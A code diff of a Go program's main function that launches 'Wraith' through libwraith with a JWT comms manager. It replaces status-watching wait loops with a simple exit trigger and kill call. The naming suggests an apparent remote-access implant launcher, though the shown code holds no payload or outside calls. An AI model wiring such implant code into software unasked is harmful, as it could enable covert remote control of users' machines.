@@ -41,42 +41,19 @@ func main() {
 	// Create Wraith
 	w := libwraith.Wraith{}
 
-	// Create a channel to watch for Wraith status updates
-	statusUpdates, _ := w.SHMWatch(libwraith.SHM_WRAITH_STATUS)
-
 	// Start Wraith in goroutine
 	go w.Spawn(
 		libwraith.Config{
 			FingerprintGenerator: func() string { return "" },
 		},
 		&stdmod.DefaultJWTCommsManager{},
+	//	&stdmod.WCommsPinecone{},
 	)
 
-	// Wait until Wraith starts up or time out
-waitloop:
-	for {
-		select {
-		case status := <-statusUpdates:
-			if status == libwraith.WSTATUS_ACTIVE {
-				break waitloop
-			}
-		case <-time.After(2 * time.Second):
-			panic("Wraith failed to start within 2 seconds")
-		}
-	}
+	// Wait until the exit trigger fires
+	<-exitTrigger
 
-	// Wait until Wraith dies or the exit trigger fires
-	for {
-		select {
-		case <-exitTrigger:
-			// TODO: Check success
-			w.Kill(30 * time.Second)
-		case status := <-statusUpdates:
-			if status == libwraith.WSTATUS_INACTIVE {
-				return
-			} else if status == libwraith.WSTATUS_ERROR {
-				panic("Wraith exited with error status")
-			}
-		}
-	}
+	// Kill Wraith and exit
+	w.Kill()
+	time.Sleep(1 * time.Second)
 }
